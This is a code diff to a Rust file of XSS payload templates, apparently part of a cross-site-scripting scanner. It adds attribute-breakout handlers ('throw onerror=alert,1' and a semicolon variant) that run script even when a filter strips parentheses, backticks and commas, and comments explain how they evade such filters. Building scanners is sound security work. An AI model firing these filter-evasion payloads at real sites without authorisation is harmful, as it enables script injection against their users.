@@ -141,6 +141,19 @@ const ATTR_SQ_TEMPLATES: &[&str] = &[
     "' ontoggle={JS} popover class={CLASS} x='",
     "' onbeforeinput={JS} contenteditable class={CLASS} x='",
     "' onmouseover={JS} id={ID} x='",
+    // Paren-free / backtick-free handler, for a filter that strips `(` `)` and
+    // backticks — which neutralises every `{JS}` primitive above (`alert(1)`,
+    // `` alert`1` ``, `confirm(1)`), so those templates are all char-gated out
+    // and this is the only surviving executor. `throw onerror=alert,1` sets
+    // `window.onerror = alert` then throws, invoking it with the error;
+    // `onerror=alert;throw 1` is the `;`-based mirror for a filter that also
+    // strips `,`. Each handler value is quoted (double-quote inside this
+    // single-quote breakout) so its inner spaces stay in one attribute, and
+    // carries an `id` marker (dup-`class` safe). Verifiable: the value carries
+    // the literal `alert` sink token. Not gated on a filter result — when parens
+    // survive, the `{JS}` forms above verify first and these are never reached.
+    "' onmouseover=\"throw onerror=alert,1\" id={ID} x='",
+    "' onmouseover=\"onerror=alert;throw 1\" id={ID} x='",
     // Slash-separated mirrors of the stay-in-tag shapes above, for a server that
     // strips literal spaces from the reflection (which collapses the space-
     // separated shapes into one merged attribute). These are always emitted, not
@@ -172,6 +185,11 @@ const ATTR_DQ_TEMPLATES: &[&str] = &[
     "\" ontoggle={JS} popover class={CLASS} x=\"",
     "\" onbeforeinput={JS} contenteditable class={CLASS} x=\"",
     "\" onmouseover={JS} id={ID} x=\"",
+    // Paren-free / backtick-free handler (inner values single-quoted to nest in
+    // the double-quote breakout); see the `ATTR_SQ_TEMPLATES` note. The only
+    // executor left when a filter strips `(` `)` and backticks.
+    "\" onmouseover='throw onerror=alert,1' id={ID} x=\"",
+    "\" onmouseover='onerror=alert;throw 1' id={ID} x=\"",
     // Slash-separated mirrors — survive space-stripping filters; see the
     // `ATTR_SQ_TEMPLATES` note for the quoting and `id`-marker reasoning (inner
     // values single-quoted here so they nest inside the double-quote breakout).
